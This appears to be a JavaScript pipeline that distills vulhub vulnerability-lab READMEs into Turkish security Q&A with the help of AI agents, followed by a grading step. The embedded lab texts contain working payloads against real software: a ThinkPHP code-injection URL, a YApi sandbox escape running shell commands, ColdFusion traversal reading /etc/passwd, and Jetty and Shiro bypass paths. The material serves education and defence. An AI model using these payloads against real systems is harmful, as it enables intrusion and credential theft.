Reproduction  To exploit this vulnerability, we can inject PHP code through the URL parameters. By visiting `http://your-ip:8080/index.php?s=/index/index/name/${@phpinfo()}`, the `phpinfo()` function will be executed on the target server, demonstrating the successful exploitation of the remote code execution vulnerability:  ![](1.png) "}, {"id": "vulhub-django-cve-2022-34265", "kaynak": "vulhub", "cve": "CVE-2022-34265", "urun": "django", "baslik": "Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265)  [中文版本(Chinese version)](README.zh-cn.md)  Dj", "yol": "django/CVE-2022-34265/README.md", "metin": "# Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265)  [中文版本(Chinese version)](README.zh-cn.md)  Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.  Django released a security update on July 4, 2022, which fixes a SQL injection vulnerability in the Trunc() and Extract() database functions. This vulnerability affects Django versions before 4.0.6, 3.2.14.  References:  - https://www.djangoproject.com/weblog/2022/jul/04/security-releases/ - https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492  ## Environment Setup  Execute the following command to start a vulnerable Django 4.0.5 server:  ``` docker compose up -d ```  After the server is started, you can access the web page at `http://your-ip:8000`.  ## Vulnerability Reproduction  The web application uses the `Trunc` function to aggregate page click counts by datetime. Visit `http://your-ip:8000/?date=minute` to see the number of clicks per minute:  ![](1.png)  To exploit the SQL injection vulnerability, modify the `date` parameter with malicious input:  ``` http://your-ip:8000/?date=xxxx'xxxx ```  The SQL error message will be displayed, confirming the successful injection:  ![](2.png) "}, {"id": "vulhub-uwsgi-unacc", "kaynak": "vulhub", "cve": "unacc", "urun": "uwsgi", "baslik": "uWSGI Unauthorized Access Vulnerability  [中文版本(Chinese version)](README.zh-cn.md)  uWSGI is a web application server, wh", "yol": "uwsgi/unacc/README.md", "metin": "# uWSGI Unauthorized Access Vulnerability  [中文版本(Chinese version)](README.zh-cn.md)  uWSGI is a web application server, which implements protocols such as WSGI/uwsgi/http, and supports for various languages through plugins. More than an application name, uwsgi is also an exchange standard between the front-end server and the back-end application container, just like Fastcgi.  uWSGI allows configuring back-end web application dynamically through Magic Variables. If the port is exposed, attackers can construct uwsgi packets and specify the magic variable `UWSGI_FILE`, so as to execute arbitrary commands by applying `exec://` protocol.  Reference links：  - https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md - https://xz.aliyun.com/t/3512 - https://uwsgi-docs.readthedocs.io/en/latest/Vars.html  ## Environment Setup  Enter the following command：  ``` docker compose up -d ```  `http://your-ip:8080` is a web application and its uwsgi is exposed to 8000 port.  ## POC  Using [poc.py](poc.py)，you can run the command `python poc.py -u your-ip:8000 -c \"touch /tmp/success\"`：  ![](1.png)  Entering the container through `docker compose exec web bash` ，you'll see `/tmp/success` creating successfully：  ![](2.png) "}, {"id": "vulhub-yapi-unacc", "kaynak": "vulhub", "cve": "unacc", "urun": "yapi", "baslik": "YApi Registration and Mock Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  YApi is a API management too", "yol": "yapi/unacc/README.md", "metin": "# YApi Registration and Mock Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  YApi is a API management tool developed by Node.JS. If registration of the YApi server is enabled, attackers will be able to execute arbitrary Javascript code in the Mock page.  References:  - <https://paper.seebug.org/1639/> - <https://www.freebuf.com/vuls/279967.html>  ## Vulnerability Environment  Execute following command to start a YApi server 1.9.2:  ``` docker compose up -d ```  After the server is started, browse the `http://localhost:3000` to see the index page of the YApi.  ## Vulnerability Reproduce  Register a normal user then create a project and an interface:  ![](1.png)  ![](2.png)  There is a \"Mock Tab\" that you can input JavaScript code, put the evil code into textarea:  ``` const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require(\"child_process\").execSync(\"id;uname -a;pwd\").toString() ```  ![](3.png)  Then, go back to the preview tab and see the Mock URL:  ![](4.png)  Open that URL, Mock script is executed and you can see the output:  ![](5.png) "}, {"id": "vulhub-adminer-cve-2021-21311", "kaynak": "vulhub", "cve": "CVE-2021-21311", "urun": "adminer", "baslik": "Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)  [中文版本(Chinese versio", "yol": "adminer/CVE-2021-21311/README.md", "metin": "# Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)  [中文版本(Chinese version)](README.zh-cn.md)  Adminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.  In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability on error page of Elasticsearch and ClickHouse. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9.  References:  - <https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6> - <https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf> - <https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml>  ## Vulnerable environment  Execute following command to start a PHP server with Adminer 4.7.8:  ``` docker compose up -d ```  After the server is started, you can see the login page of Adminer at `http://your-ip:8080`.  ## Exploit  Select the ElasticSearch as the system field, then input `example.com` into the server field. Click the login button, you will see the 400 response from `example.com`:  ![](1.png) "}, {"id": "vulhub-coldfusion-cve-2010-2861", "kaynak": "vulhub", "cve": "CVE-2010-2861", "urun": "coldfusion", "baslik": "Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861)  [中文版本(Chinese version)](README.zh-cn.md)  Adobe Cold", "yol": "coldfusion/CVE-2010-2861/README.md", "metin": "# Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861)  [中文版本(Chinese version)](README.zh-cn.md)  Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.  There is a directory traversal vulnerability in the Adobe ColdFusion 9.0.1 and earlier, which allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.  ## Environment setup  Execute the following command to start Adobe CouldFusion 8.0.1 server:  ``` docker compose up -d ```  The server startup may take 1~5 minutes. After that, visit `http://your-ip:8500/CFIDE/administrator/enter.cfm` to see the initialization page, enter the password `admin` to initialize the entire server.  ## POC  Read the file `/etc/passwd` via `http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en`:  ![](1.png)  Read the background administrator password via `http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/ password.properties%00en`:  ![](2.png) "}, {"id": "vulhub-php-fpm", "kaynak": "vulhub", "cve": "fpm", "urun": "php", "baslik": "PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  PHP-FPM (F", "yol": "php/fpm/README.md", "metin": "# PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  PHP-FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with some additional features useful for sites of any size, especially busier sites. When misconfigured, PHP-FPM can be accessed directly through the FastCGI protocol, allowing attackers to execute arbitrary PHP code.  This vulnerability occurs when PHP-FPM is exposed to the network without proper access controls, allowing unauthorized access to the FastCGI interface.  References:  - <https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html> - <https://www.php.net/manual/en/install.fpm.php>  ## Environment Setup  Execute the following command to start the vulnerable PHP-FPM server:  ```bash docker compose up -d ```  After the server starts, the PHP-FPM server will listen on port 9000.  ## Vulnerability Reproduction  A proof-of-concept exploit script is available at: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75  The script allows you to:  1. Connect directly to the PHP-FPM port 2. Send crafted FastCGI requests 3. Execute arbitrary PHP code on the target server  Successful exploitation result:  ![](1.jpg) "}, {"id": "vulhub-showdoc-3-2-5-sqli", "kaynak": "vulhub", "cve": "3.2.5-sqli", "urun": "showdoc", "baslik": "ShowDoc 3.2.5 SQL Injection  [中文版本(Chinese version)](README.zh-cn.md)  ShowDoc is a tool greatly applicable for an IT te", "yol": "showdoc/3.2.5-sqli/README.md", "metin": "# ShowDoc 3.2.5 SQL Injection  [中文版本(Chinese version)](README.zh-cn.md)  ShowDoc is a tool greatly applicable for an IT team to share documents online. It can promote communication efficiency between members of a team.  ShowDoc version <= 3.2.5, an unauthenticated SQL injection issue is found and attacker is able to steal user password and token from SQLite database.  References:  - <https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda>  ## Vulnerable environment  Execute following command to start a ShowDoc server 3.2.4:  ``` docker compose up -d ```  After the server is started, browse `http://your-ip:8080` to see the index page of ShowDoc. Log in the portal using username `showdoc` and password `123456`.  ## Exploit  Once a user has logged into ShowDoc, a user token is generated in the SQLite database. Compared to stealing a user's hashed password through SQL injection，user token is a more useful target.  Before exploiting the issue, a CAPTCHA recognition library is required:  ``` pip install onnxruntime ddddocr requests ```  Then use [this POC](poc.py) to extract the token:  ``` python3 poc.py -u http://localhost:8080 ```  ![](1.png)  To test if the token is valid:  ![](2.png) "}, {"id": "vulhub-shiro-cve-2010-3863", "kaynak": "vulhub", "cve": "CVE-2010-3863", "urun": "shiro", "baslik": "Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863)  [中文版本(Chinese version)](README.zh-cn.md)  Apache Shiro", "yol": "shiro/CVE-2010-3863/README.md", "metin": "# Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863)  [中文版本(Chinese version)](README.zh-cn.md)  Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.  Apache Shiro before 1.1.0, and JSecurity 0.9.x, does not canonicalize URI paths before comparing them to entries in the shiro.ini file, which allows remote attackers to bypass intended access restrictions via a crafted request, as demonstrated by the `/./`, `/../`, `/`, `//` URI.  References:  - <https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34> - <https://xz.aliyun.com/t/11633#toc-2> - <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863>  ## Vulnerable Environment  Start an application with Spring and Shiro 1.0.0 by executing the following command.  ``` docker compose up -d ```  Once the environment is started, visit ``http://your-ip:8080`` to see the home page.  ## Vulnerability Reproduce  A direct request to the admin page `/admin` is inaccessible and will be redirected to the login page.  ![](1.png)  Construct a malicious request `/./admin` to bypass authentication checks and access the admin page.  ![](2.png) "}, {"id": "vulhub-jetty-cve-2021-34429", "kaynak": "vulhub", "cve": "CVE-2021-34429", "urun": "jetty", "baslik": "Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429)  [中文版本(Chinese version)](README.zh-cn.md)  E", "yol": "jetty/CVE-2021-34429/README.md", "metin": "# Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429)  [中文版本(Chinese version)](README.zh-cn.md)  Eclipse Jetty is a Java web server and Java Servlet container.  Jetty 9.4.40 fixed an ambiguous paths information disclosure vulnerability [CVE-2021-28164](https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164), CVE-2021-34429 is a variation and bypass of it.  There are 3 types of payload that exfiltrate the content of `WEB-INF/web.xml`:  - Unicode based URL encoded: `/%u002e/WEB-INF/web.xml` - `\\0` with `.` bug:  `/.%00/WEB-INF/web.xml` - `\\0` with `..` bug: `/a/b/..%00/WEB-INF/web.xml`  The vulnerability affects the Jetty 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.  References:  - https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm - https://xz.aliyun.com/t/10039  ## Vulnerable Application  Execute the following command to start a Jetty 9.4.40 server.  ``` docker compose up -d ```  After the server starts, visit ``http://your-ip:8080`` to see an example page.  ## Exploit  The sensitive file web.xml is not accessible through `/WEB-INF/web.xml`.  ![](1.png)  Use payload `/%u002e/WEB-INF/web.xml` to bypass the restriction:  ![](2.png) "}, {"id": "vulhub-phpunit-cve-2017-9841", "kaynak": "vulhub", "cve": "CVE-2017-9841", "urun": "phpunit", "baslik": "PHPUnit Remote Code Execution (CVE-2017-9841)  [中文版本(Chinese version)](README.zh-cn.md)  PHPUnit is a programmer-oriente", "yol": "phpunit/CVE-2017-9841/README.md", "metin": "# PHPUnit Remote Code Execution (CVE-2017-9841)  [中文版本(Chinese version)](README.zh-cn.md)  PHPUnit is a programmer-oriented testing framework for PHP.  `Util/PHP/eval-stdin.php` in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a `<?php` substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` URI.  The `Util/PHP/eval-stdin.php`'s vulnerable code:  ```php eval('?>'.file_get_contents('php://input')); ```  Reference links:  - http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/ - https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/  ## Vulnerable environment  Execute following command to start a Apache web server, which contains the PHPUnit 5.6.2 in the Web directory.  ``` docker compose up -d ```  Open the `http://your-ip:8080` to see the index page util Web server is running.  ## Exploit  Send the request to `http://your-ip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`, which contains any PHP code within the body:  ![](1.png) "}]
log('Damitilacak vulhub lab: ' + kaynaklar.length)

const DAMIT_SCHEMA = { type:'object', additionalProperties:false, required:['adet'], properties:{ adet:{type:'integer'} } }
const DOG_SCHEMA = { type:'object', additionalProperties:false, required:['puan','sadik','turkce_temiz','sorun'],
  properties:{ puan:{type:'integer'}, sadik:{type:'boolean'}, turkce_temiz:{type:'boolean'}, sorun:{type:'string'} } }

function damitPrompt(d){
  const qa = QA + '\\guvenlik_' + d.id + '_damit.jsonl'
  return `Sen kidemli bir siber guvenlik uzmanisin ve Turkce yaziyorsun. Elinde GERCEK bir zafiyet lab dokumani var: vulhub deposundan, ${d.urun} urununde ${d.cve} zafiyeti — "${d.baslik}". Gorevin bunu Turkce ILERI soru-cevaba DAMITMAK: ceviri degil, zafiyetin "guncel dunyada anlamak/tespit/savunmak icin ise yarayan" ozunu + pratisyen yargiyi cikarmak.

GERCEK DOKUMAN:
"""
${d.metin}
"""

Bundan 5-8 adet ILERI Turkce soru-cevap cifti uret:
- Dokumandaki SPESIFIK, somut ayrintilari yakala: gercek CVE, etkilenen SURUM araligi, zafiyetin KOK NEDENI (hangi fonksiyon/parametre/yanlis konfig), tetikleyen istegin YAPISI (endpoint/HTTP metodu/parametre), etkisi (RCE/XXE/deserialization vb.). Jenerik "X nedir" DEGIL; bu lab'a ozel.
- Soru tipleri: mekanizma ("bu RCE tam olarak neden mumkun"), surum/kosul ("hangi surumler ve neden debug/konfig sart"), TESPIT ("bu istismari log/trafikte nasil yakalarsin, hangi endpoint/imza"), SAVUNMA ("nasil kapatirsin: yama surumu/konfig/WAF kurali"), kok-neden analizi.
- Cerceve EGITIM + TESPIT + SAVUNMADIR: mekanizmayi anla, sonra nasil tespit/savunulacagini ver. Canli hedefe karsi adim-adim saldiri receti verme; savunanin/analistin isine yara.
KURALLAR: cevaplar kendi icinde yeterli, dogru, ILERI, ~110-320 kelime; duzgun Turkce ozel karakterler (c,g,i,o,s,u yerine MUTLAKA ç,ğ,ı,ö,ş,ü) kullan; teknik terim/komut/urun/CVE/endpoint adlarini orijinal birak; dokumanda OLMAYAN spesifik ayrinti (surum, CVE, komut) UYDURMA.
JSONL yaz (her satir bir JSON nesnesi: {"soru":"...","cevap":"...","kaynak":"${d.id}-damit","alan":"guvenlik"}), Write araciyla tam su yola: ${qa}
Bittiginde JSON dondur: {"adet": <yazdigin cift sayisi>}.`
}

function dogPrompt(r){
  const qa = QA + '\\guvenlik_' + r.id + '_damit.jsonl'
  return `Bir kalite denetcisisin. Su dosyayi Read ile oku: ${qa}
Bu, ${r.urun}/${r.cve} vulhub lab'indan damitilmis Turkce ileri guvenlik soru-cevap setidir. Degerlendir:
- puan (1-5): icerik gercekten ILERI ve ise yarar mi (5=pratisyen-degeri yuksek, spesifik; 1=yuzeysel/jenerik).
- sadik (bool): iddialar dokuman ruhuyla tutarli mi, spesifik surum/CVE/teknik UYDURULMAMIS mi.
- turkce_temiz (bool): Turkce ozel karakterler (ç,ğ,ı,ö,ş,ü) duzgun mu (ASCII-Turkce bozulma YOK mu).
- sorun (kisa string): en onemli eksik/hata; yoksa "yok".
Dosya yoksa/bossa puan=0, sorun="dosya yok/bos". Sadece JSON dondur.`
}

const sonuc = await pipeline(kaynaklar,
  (d) => agent(damitPrompt(d), { label:'damit:'+d.id, phase:'Damit', effort:'medium', schema:DAMIT_SCHEMA })
           .then((r)=>({ id:d.id, urun:d.urun, cve:d.cve, adet:r.adet||0 }))
           .catch(()=>({ id:d.id, urun:d.urun, cve:d.cve, adet:0, hata:true })),
  (r) => {
     if (r.hata || !r.adet) return { ...r, puan:0, sadik:false, turkce_temiz:false, sorun:(r.hata?'damitma bloklu/hata':'cift uretilmedi') }
     return agent(dogPrompt(r), { label:'dog:'+r.id, phase:'Dogrula', effort:'low', schema:DOG_SCHEMA })
              .then((v)=>({ ...r, ...v })).catch(()=>({ ...r, puan:-1, sadik:false, turkce_temiz:false, sorun:'dogrulama hatasi' }))
  }
)

const arr = sonuc.filter(Boolean)
const toplamQA = arr.reduce((n,x)=>n+(x.adet||0),0)
const bloklu = arr.filter(x=>x.hata).length
const kirli = arr.filter(x=>x.adet>0 && x.turkce_temiz===false).map(x=>x.id)
const zayif = arr.filter(x=>typeof x.puan==='number' && x.puan>0 && x.puan<3).map(x=>x.id)
log('Damitilan Q&A: '+toplamQA+' | bloklu: '+bloklu+' | ASCII-kirli: '+kirli.length+' | zayif(<3): '+zayif.length)
return { dokuman: arr.length, toplamQA, bloklu, kirli, zayif, detay: arr }
